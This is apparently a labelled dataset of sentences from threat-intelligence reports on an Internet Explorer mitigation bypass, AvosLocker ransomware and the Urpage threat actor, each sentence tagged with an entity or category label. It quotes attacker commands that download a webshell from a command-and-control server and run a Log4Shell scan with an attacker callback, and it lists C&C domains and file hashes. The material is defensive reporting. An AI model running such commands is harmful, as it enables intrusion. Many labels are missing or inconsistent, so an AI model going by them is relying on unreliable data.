text: They’re put together by Palo Alto Networks Unit 42 threat research team and are meant for you to read and share with your family, friends, and coworkers so you can all be safer and get on with the business of your digital life.
label: identity

text: Got a topic you want us to write about for you, your friends, or your family?
label: safe

text: Email us at u42comms@paloaltonetworks.com.
label: EMAIL

text: In February, Microsoft awarded $100,000 to Yu Yang (@Tombkeeper) for reporting a new mitigation bypass technique as part of Microsoft’s Bounty Program.
label: identity

text: Yu later demonstrated his research at CanSecWest in March.
label: identity

text: In his slides, he mentioned that a "god mode" of Internet Explorer could be turned on by a one byte overwrite.
label: SOFTWARE

text: However, he had to heavily redact this information due to an agreement between himself and Microsoft.
label: identity

text: After his slides were released, researchers began working to determine what the missing parts were.
label: safe

text: And before long, Yuki Chen (@guhe120), a Chinese researcher, posted his answer.
label: identity

text: Although the code was removed soon after posting, a copy was still maintained and used by Metasploit.
label: tools

text: Following this code, another researcher posted his VB script version using more advanced techniques.
label: safe

text: Yu Yang then pasted his shellcode that used similar methods to run arbitrary code, showing that the method Yuki Chen used is exactly the one that won Yu the $100,000 award.
label: identity

text: The main idea of new exploitation technique is to alter a flag that is used to control the security setting of an ActiveX object.
label: safe

text: If an attacker could modify it, then any script can be run, such as downloading and executing a PE file, without any notification or alert.
label: safe

text: Further details were discussed in depth last month on Rapid7’s blog.
label: identity

text: The most interesting aspect of this method is that it could bypass all existing mitigation techniques including DEP/ASLR/EMET, and it also defeats some academic methods such as Control Flow Integrity (CFI).
label: safe

text: So this raises another question: If there are no mitigation functions, do we have any other ways to defend against attacks similar to this?
label: safe

text: The first line of defense is the IPS.
label: safe

text: Although an attacker can use a variety of obfuscation techniques for HTML, we are still able to extract some features to create signatures.
label: safe

text: To address such an issue, we’ve created signatures 36442, 36468, and 36469 to provide coverage for the security flag overwrite.
label: safe

text: Although we are not aware of any attacks using this technique, these signatures have proven effective in our testing against code publicly available on the Internet.  When we take a closer look at the three exploits in our blog post last month, we see that various exploit techniques are based on a singular condition, which is arbitrary memory access.
label: safe

text: Only when attackers have the right to read/write any address can they utilize either Flash or ActiveX methods to get code execution.
label: safe

text: If we went even further, all three vulnerabilities are Use-After-Free bugs.
label: safe

text: The three vulnerabilities each contain code to alter a user-controlled address, and the code can be distilled down to the following operations:
label: safe

text: Here, xyz indicates a user-controlled address that contains the length of a vector object or length of an Int32Array.
label: safe

text: Using these operations, attackers are able to modify the length values to create an object with an incorrect size, which will allow for read and write operations to occur in memory that is not part of the vector object.
label: safe

text: The attackers can then use this object to perform further operations such as modification of security flag in ActiveX.  To prevent such attacks, a better idea is to detect if an arbitrary address is accessed during execution.
label: safe

text: In WildFire, we added modules for web browser scripts and third party plugins such as Flash.
label: SOFTWARE

text: One such module leverages the fact that the length of a vector object is always consistent with memory allocation, which means we can deduce the memory usage from the sum of the length of all allocated vectors.
label: safe

text: If the calculated value does not match the real value, it indicates some of the vector objects may have been modified.
label: safe

text: Using this method, we are able to provide length checking for Flash vector objects.
label: SOFTWARE

text: This module validates the accessing behavior at runtime.
label: safe

text: If the length were suspicious, the detection module stops the malicious operation.
label: safe

text: Through our enterprise security platform, including IPS and WildFire, we continue to innovate and prevent advanced exploitation techniques.
label: SOFTWARE

text: Leave a comment below let us know what you think.
label: safe

text: We found samples of AvosLocker ransomware that makes use of a legitimate driver file to disable antivirus solutions and detection evasion.
label: malware

text: While previous AvosLocker infections employ similar routines, this is the first sample we observed from the US with the capability to disable a defense solution using a legitimate Avast Anti-Rootkit Driver file (asWarPot.sys).
label: malware

text: In addition, the ransomware is also capable of scanning multiple endpoints for the Log4j vulnerability Log4shell using Nmap NSE script.
label: vulnerability

text: Infection chain      Figure 1. AvosLocker infection chain      According to our analysis, the suspected entry point is via the Zoho ManageEngine ADSelfService Plus (ADSS) exploit:      Figure 2.
label: malware

text: The ADSS exploit abusing CVE-2021-40539     Due to the lack of network traffic details, we could not identify the exact CVE ID of the security gap the attacker used.
label: vulnerability

text: However, there are some indications that they abused the same vulnerability previously documented by Synacktiv during a pentest, CVE-2021-40539.
label: vulnerability

text: The gap we observed was particularly similar to the creation of JSP files (test.jsp), execution of keytool.exe with “null” parameters to run a crafted Java class/code.
label: FILEPATH

text: Mapping the infection
label: safe

text: The ADSS JAVA component (C:\ManageEngine\ADSelfService Plus\jre\bin\java.exe) executed mshta.exe to remotely run a remotely-hosted HTML application (HTA) file from the attackers’ command and control (C&C) server.
label: FILEPATH

text: Using Trend Micro™ Vision One™, we mapped out the processes that the infection performed to spawn the process.
label: SOFTWARE

text: Figure 3. Remotely executing an HTA file from the C&C server.
label: safe

text: Screenshots taken from Trend Micro Vison One.
label: SOFTWARE

text: Figure 4. HTA file connecting to the C&C
label: safe

text: A closer look at the HTA file revealed that the mshta.exe downloads and executes the remotely hosted HTA file.
label: safe

text: The HTA executed an obfuscated PowerShell script that contains a shellcode, capable of connecting back to the C&C server to execute arbitrary commands.
label: tools

text: Figure 5.
label: safe

text: Obfuscated PowerShell script contains a shellcode
label: tools

text: The PowerShell process will download an ASPX webshell from the C&C server using the command < cmd.exe /c powershell -command Invoke-WebRequest -Uri hxxp://xx.xx.xx.xx/subshell.aspx -OutFile /ManageEngine/ADSelfService Plus/webapps/adssp/help/admin-guide >.
label: SOFTWARE

text: According to Synacktiv’s research, with this command, the downloaded ASPX webshell is downloaded from a remote IP address and saved to the directory, and still accessible to the attacker.
label: SOFTWARE

text: The attackers gathered system information using available tools such as whoami and systeminfo, as well as PowerShell commands.
label: tools

text: Figure 6.
label: safe

text: Gather system information     The code executes on the current domain controller to gather the username information, while the query user information gathers data about user sessions on a Remote Desktop Session Host server, name of the user, session ID, state of the session (either active or disconnected), idle time, date, and time the user logged on.
label: safe

text: Figure 7. Executed with the /domain argument to collect username information      Figure 8.
label: safe

text: query user information for session data
label: safe

text: The PowerShell downloads, installs, and allows the remote desktop tool AnyDeskMSI through the firewall.
label: tools

text: Figure 9. The PowerShell downloading and installing AnyDeskMSI
label: tools

text: We observed that a new user account was created, added to the current domain, and included in the administrator group.
label: safe

text: This ensures the attacker can have administrative rights to the infected system.
label: safe

text: The attackers also checked the running processes in the system via TaskList to check for antivirus processes running in the infiltrated system.
label: safe

text: Figure 10. Creating a new account with admin rights      Figure 11. Checking for antivirus processes running     During the scan, we observed an attempt to terminate security products initiated via TaskKill.
label: safe

text: Testing the sample with Trend Micro Vision One, the attempt failed as its sensors were still able to send activity data to the platform.

text: Figure 12.

label: safe

text: Additional tools and components were copied to the compromised machine using AnyDeskMSI to scan the local network and disable security products.
label: tools

text: The tools transferred using AnyDesk are:  Netscan: To scan for other endpoints Nmap (log4shell.nse): To scan for Log4shell vulnerable endpoints Hacking tools Mimikatz and Impacket: For lateral movement PDQ deploy: For mass deployment of malicious script to multiple endpoints Aswarpot.sys: For disabling defense solutions.

text: We noted that it can disable a number of antivirus products, previously identified by Aon’s researchers.

text: Figure 17 shows the list of processes that the routine searches on infection :  EndpointBasecamp.exe Trend Micro Endpoint Basecamp ResponseService.exe PccNTMon.exe SupportConnector.exe AOTAgent.exe CETASvc.exe CETASvc iVPAgent.exe tmwscsvc.exe TMResponse AOTAgentSvc TMBMServer iVPAgent Trend Micro Web Service Communicator Tmccsf Tmlisten Ntrtscan TmWSCSvc       Figure 17.

text: Other executions and lateral movement
label: attack-pattern

text: After disabling the security products, the actors behind AvosLocker again tried to transfer other tools, namely Mimikatz and Impacket.

text: They used the command nmap  --script log4shell.nse --script-args log4shell.waf-bypass=true --script-args log4shell.callback-server=xx.xx.xx.xx:1389 -p 80,443 xx.xx.xx.xx/xx, and set the callback server to the attacker group C&C server.       Figure 23.

text: Deploying across the network We saw software deployment tool PDQ being used to deploy malicious batch scripts to multiple endpoints in the network.
label: attack-pattern

text: Figure 25. Deploying malicious batch scripts to other endpoints     The deployed batch script has the following commands:  Disable Windows Update and Microsoft Defender       Figure 26. Disable Microsoft defense services      Prevents safeboot execution of security products       Figure 27. Prevent security products’ execution      Create new administrator account       Figure 28. Create new account      Add the AutoStart mechanism for the AvosLocker executable (update.exe)       Figure 29. Add Autostart for ransomware executable      Disables legal notice caption       Figure 30. Disable legal notice      Set safeboot with networking and disables Windows Error Recovery and reboot       Figure 31. Setting and disabling network and specific Windows functions     Conclusion
label: malware

text: While AvosLocker has been documented for its abuse of AnyDesk for lateral movement as its preferred application, we note that other remote access applications can also be abused to replace it.
label: malware

text: We think the same can be said for the software deployment tool, wherein the malicious actors can subsequently decide to replace and abuse it with other commercially available ones.
label: safe

text: In addition, aside from its availability, the decision to choose the specific rootkit driver file is for its capability to execute in kernel mode (therefore operating at a high privilege).
label: safe

text: This variant is also capable of modifying other details of the installed security solutions, such as disabling the legal notice.
label: safe

text: Other modern ransomware, such as Mespinoza/Pysa, modify the registries of infected systems during their respective routines to inform their victims that they have been compromised.
label: threat-actor

text: Similar to previously documented malware and ransomware groups, AvosLocker takes advantage of the different vulnerabilities that have yet to be patched to get into organizations’ networks.
label: malware

text: Once inside, the continuing trend of abusing legitimate tools and functions to mask malicious activities and actors’ presence
label: safe

text: grows in sophistication.
label: safe

text: In this case, the attackers were able to study and use Avast’s driver as part of their arsenal to disable other vendors’ security products.
label: identity

text: However, and specific to this instance, the attempt to kill an antivirus product such as this variant’s TaskKill can also be foiled.
label: safe

text: In this example using Trend Micro Vision One, the attempt was unsuccessful likely due to the product’s self-protection feature, which allowed the sensors to continue sending data and block the noted routine.
label: SOFTWARE

text: The visibility enabled by the platform allowed us as researchers to capture the extent of this ransomware’s attack chain and replicate the driver file being abused to verify its function during compromise.
label: safe

text: Avast responded to our notification with this statement: "We can confirm the vulnerability in an old version of our driver aswArPot.sys, which we fixed in our Avast 21.5 released in June 2021.
label: FILEPATH

text: We also worked closely with Microsoft, so they released a block in the Windows operating system (10 and 11), so the old version of the Avast driver can't be loaded to memory.
label: SOFTWARE

text: The below example shows that the blocking works (output from the "sc start" command):
label: safe

text: (SC) StartService FAILED 1275:                This driver has been blocked from loading
label: safe

text: The update from Microsoft for the Windows operating system was published in February as an optional update, and in Microsoft's security release in April, so fully updated machines running Windows 10 and 11 are not vulnerable to this kind of attack.
label: SOFTWARE

text: All consumer and business antivirus versions of Avast and AVG detect and block this AvosLocker ransomware variant, so our users are protected from this attack vector.
label: SOFTWARE

text: For users of third-party antivirus software, to stay protected against this vulnerability, we recommend users to update their Windows operating system with the latest security updates, and to use a fully updated antivirus program."
label: SOFTWARE

text: Tags  Malware | Exploits & Vulnerabilities | Cyber Threats | APT & Targeted Attacks | Compliance & Risks | Endpoints | Ransomware | Network | Articles, News, Reports

text: In the process of monitoring changes in the threat landscape, we get a clearer insight into the way threat actors work behind the schemes.
label: safe

text: In this case we dig deeper into the possible connection between cyberattacks by focusing on the similarities an unnamed threat actor shares with Confucius, Patchwork, and another threat actor called Bahamut.
label: threat-actor

text: For the sake of this report, we will call this unnamed threat actor “Urpage.”
label: threat-actor

text: What sets Urpage attacks apart is its targeting of InPage, a word processor for Urdu and Arabic languages.
label: SOFTWARE

text: However, its Delphi backdoor component, which it has in common with Confucius and Patchwork, and its apparent use of Bahamut-like malware, is what makes it more intriguing as it connects Urpage to these other known threats.
label: threat-actor

text: In our previous entry, we already covered the Delphi component in the context of the Confucius and Patchwork connection.
label: threat-actor

text: We mentioned Urpage as a third unnamed threat actor connected to the two.
label: threat-actor

text: This time, we look into Urpage to gain a deeper insight into the way several threat actors' actions intersect.
label: threat-actor

text: The Bahamut Link Fake websites
label: threat-actor

text: The link between Bahamut and Urpage can be best discussed by way of the multiple malicious Android samples that matched Bahamut's code and had C&C belonging to the Urpage infrastructure.
label: Infrastucture

text: Some of these C&C websites also act as phishing sites that lure users into downloading these very applications.
label: attack-pattern

text: The threat actor sets up these fake websites describing the application and linking to the Google Play Store to download it, like in the case of the malicious website, pikrpro[.]eu, seen below  Another sample website involved the use of a closely copied version of an existing website, with slight changes in the logo and options above the page.
label: SOFTWARE

text: The download links were also replaced to download the malicious Android application instead.
label: SOFTWARE

text: Original (top) and modified (bottom) website
label: safe

text: Upon writing this entry, we’ve coordinated with Google to ensure that the malicious applications these C&C sites advertise are no longer available for download on the Google Play Store.
label: identity

text: It is important to note however, that not all C&C websites for Urpage advertise malicious applications.
label: threat-actor

text: Some simply contain a random template with empty categories, likely as a ploy to hide its malicious activities.
label: safe

text: Android targeting
label: SOFTWARE

text: As with Bahamut applications, once downloaded and executed, it showed multiple malicious features that deal with stealing information.
label: attack-pattern

text: Some of these features are listed below.
label: safe

text: Retrieves basic information like network information and MAC address from an infected phone SMS stealing Contacts stealing Audio recording GPS location retrieval Steals files with the specific extensions, although not all samples target these extensions.
label: safe

text: File type File extensions Document files .txt, .csv, .doc, .docx, .xls, .xlsx, .pdf WhatsApp databases .db.crypt5 to .db.crypt12 Geolocation related files .kml, .kmz,  .gmx, .aqm Audio files .mp3, .opus Videos .mp4, .amr, .wmv, .3gp, Pictures .jpeg, .jpg
label: SOFTWARE

text: Of note is one specific application that had a different purpose from the others.
label: safe

text: This application has the same encryption routine as other Urpage applications.
label: threat-actor

text: Instead of stealing documents or images, it works on top of a modified version of the legitimate Threema, an end-to-end encrypted messaging application, to steal screenshots of messages.
label: SOFTWARE

text: This application has the same icon and label as the legitimate Threema.
label: SOFTWARE

text: Once launched, it drops a modified APK version of Threema and prompts the user to install the application.
label: SOFTWARE

text: The malicious application then hides its icon on the device but still runs in the background, while the modified Threema works like normal.
label: SOFTWARE

text: Unknown to the user, the code in the modified Threema allows it to take screenshots of itself every 10 seconds.
label: TIME

text: These images are stored in the location/sdcard/Android/data/ch.threema.app/DataData directory, while the “dropper” or the malicious application working in the background uploads the images to the C&C for the threat actor to access.
label: FILEPATH

text: Figure 2. Comparison of legitimate Threema code (left) to the modified version (right) with the inserted code
label: SOFTWARE

text: Other activities
label: safe

text: Aside from acting as a C&C and distributing Bahamut-like malware, some of these websites also serve as the host for other malicious documents.
label: threat-actor

text: These other activities further establish the link of Urpage — and consequently Bahamut — to other threat actors.
label: threat-actor

text: Take, for example, the previously mentioned pikrpro[.]eu.
label: DOMAIN

text: This C&C website also acts as host not only for the malicious Android application but also for two other malicious documents listed here.
label: SOFTWARE

text: A malicious RTF file that exploits the CVE-2017-8750 and drops a malicious VB backdoor with C&C appswonder[.]info A malicious InPage file that exploits CVE-2017-12824 and drops two files, one non-malicious, and one malicious VB backdoor with C&C referfile[.]com  Talos recently reported both C&C domain names with one type of campaign that targets iOS and involves MDM, and another type using VB and Delphi backdoors.
label: vulnerability

text: This leads us back to the Confucius and Patchwork link.
label: threat-actor

text: The Confucius Link
label: threat-actor

text: In our previous entry, we already discussed how Confucius used the same Delphi file stealer as Urpage.
label: threat-actor

text: Digging into Urpage, we found another link—two malicious RTF files that exploit different vulnerabilities but download a similar script (detected as TROJ_POWLOAD.GAA) containing two base64-encoded URLs.
label: threat-actor

text: One of the URLs is for the decoy document, while the other one is for the payload.
label: safe

text: One of the RTF files was found in a server related to Confucius (f1a54dca2fdfe59ec3f537148460364fb5d046c9b4e7db5fc819a9732ae0e063, detected as TROJ_CVE201711882.AG), while the other one (434d34c0502910c562f5c6840694737a2c82a8c44004fa58c7c457b08aac17bd,detected as Mal_CVE20170199-2) downloaded a VB Backdoor that pings back to twitck[.]com, a domain name belonging to Urpage.
label: SHA2

text: The Patchwork Link Patchwork also uses the Delphi file stealer as a similarity with Urpage, which suggests the three groups are somehow related.
label: threat-actor

text: But this link is further fortified by the Android applications we found whose code is like that of Bahamut, with the C&C matching the usual name registration pattern of Patchwork’s group, as well as an infrastructure close to an old Patchwork domain.
label: SOFTWARE

text: Patchwork has also recently employed Android malware in its attacks, with its use of a customized version of AndroRAT.
label: malware

text: Summary
label: safe

text: The many similarities and connections show that threat actors do not work in isolation, and that attacks do not necessarily appear from out of nowhere.
label: safe

text: This may even suggest that a single development team may be behind this attack — maybe a single paid group that has sold its tools and services to other groups with different goals and targets.
label: safe

text: We’ve summarized all the mentioned findings in the table below.
label: safe

text: Urpage Bahamut Confucius Patchwork "BioData" Delphi backdoor and file stealer X   X X VB backdoor X       Android "Bahamut-like" malware X X   X Custom Android malware     X   AndroRAT Android malware       X InPage malicious documents X   X   simply obfuscated HTA downloaders X   X   IOS malware X       Confucius malware     X   remote-access-c3 backdoor     X   Sneepy/Byebye shell malware     X   Python cloud filestealers     X   AllaKore RAT     X   Badnews malware       X QuasarRAT       X NDiskMonitor malware       X   Targets
label: threat-actor

text: We did not find Urpage victims in our telemetry, likely because of the targeted nature of these attacks.
label: threat-actor

text: However, the domains used by Urpage provided hints about its target.
label: threat-actor

text: For one, there is the domain pikrpro[.]eu and its subdomains—the islamicfinderfeedback[.]pikrpro[.]eu and the memrifilesforinfo[.]pikpro[.]eu.
label: DOMAIN

text: Additionally, many of the files related to the Urpage domains are auto-extractable files that drop Delphi or VB backdoor and open a decoy document.
label: threat-actor

text: The decoy documents tell more about Urpage's possible targets, as it contains text from articles about the region of Kashmir.
label: threat-actor

text: The header for a sample document can be seen below.
label: safe

text: The documents can also be image files with the same theme, as can be seen here.  Multiple Android applications further drive this notion, as they provide services based on the interests of users in that region.
label: safe

text: They have a malicious application that provides services for religion, as well as popular sports in the region.
label: safe

text: Figure 3. Malicious application for observing Ramadan  Figure 4.
label: safe

text: Malicious application for cricket news Solutions and Mitigation Taking note of these similarities and connections can help organizations and users in their continued defense against Urpage, Bahamut, Confucius, and Patchwork.
label: threat-actor

text: The connection of Urpage to the other three threat actors demonstrate that cyberattacks don’t exist in silos and that it hints at a circulation of knowledge and technologies that help in the continuing evolution of different malicious campaigns.
label: threat-actor

text: Given this knowledge, organizations must be more vigilant in monitoring threats, as changes in one may mean that changes in others could follow.
label: safe

text: Organizations can develop defenses against the social engineering component these four threat actors have in common.
label: safe

text: Users should be able to identify the indicators of a social engineering campaign.
label: safe

text: Paying close attention to the domain name of a website before performing any further action can also help mitigate threats, including threats like Urpage that have targeted victims.
label: threat-actor

text: As an additional defense against the growing use of malicious mobile applications, enterprises and end users can benefit from multilayered mobile security solutions such as Trend Micro™ Mobile Security for Android™ which is also available on Google Play.
label: SOFTWARE

label: SOFTWARE

text: It can protect users against malware, zero-day and known exploits, privacy leaks, and application vulnerability.
label: attack-pattern

text: For organizations, Trend Micro™ Mobile Security for Enterprise provides device, compliance and application management, data protection, and configuration provisioning.
label: SOFTWARE

text: It also protects devices from attacks that leverage vulnerabilities, preventing unauthorized access to apps, as well as detecting and blocking malware and fraudulent websites.
label: safe

text: The Trend Micro™ Deep Discovery™ threat protection platform enables organizations to detect, analyze, and respond to modern threats such as sophisticated malware, targeted attacks, and APTs.
label: SOFTWARE
